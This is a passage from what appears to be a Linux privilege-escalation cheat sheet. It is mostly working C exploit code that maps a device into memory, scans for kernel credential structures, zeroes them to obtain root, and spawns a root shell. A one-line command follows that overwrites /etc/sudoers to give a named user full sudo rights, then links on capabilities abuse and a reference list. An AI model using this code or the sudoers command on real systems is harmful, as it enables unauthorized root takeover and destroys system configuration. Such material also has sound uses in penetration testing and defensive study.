    printf("[-] Open failed!\n");
    return -1;
  }
  printf("[+] Open OK fd: %d\n", fd);

  unsigned long size = 0xf0000000;
  unsigned long mmapStart = 0x42424000;
  unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ
  | PROT_WRITE, MAP_SHARED, fd, 0x0);
  if (addr == MAP_FAILED) {
    perror("[-] Failed to mmap: ");
    close(fd);
    return -1;
  }

  printf("[+] mmap OK addr: %lx\n", addr);

  unsigned int uid = getuid();
  printf("[+] UID: %d\n", uid);

  unsigned int credIt = 0;
  unsigned int credNum = 0;
  while (((unsigned long)addr) < (mmapStart + size - 0x40))
  {
    credIt = 0;
    if (
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid
    ) {
      credNum++;
      printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr,
      credNum);
      credIt = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      if (getuid() == 0) {
        puts("[+] GOT ROOT!");
        // Should be redondant - will trigger an "Operation not permitted" if the uids / gids somehow failed
        setuid(0);
        setgid(0);
        execl("/bin/sh", "sh", 0);
        break;
      }
      else
      {
        credIt = 0;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
      }
    }
    addr++;
  }
  puts("[+] Scanning loop END");
  fflush(stdout);
  int stop = getchar();
  return 0;
}
```

### Root write access

```
/bin/echo "<USERNAME>    ALL=(ALL:ALL) ALL" > /etc/sudoers
```

### Capabilities

https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099


--------------------------------------------------------------------------------

### References

https://book.hacktricks.xyz/linux-unix/privilege-escalation

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=299007

https://unix.stackexchange.com/questions/47208/what-is-the-difference-between-kernel-drivers-and-kernel-modules

https://bitvijays.github.io/LFC-BinaryExploitation.html

https://www.boiteaklou.fr/Abusing-Shared-Libraries.html
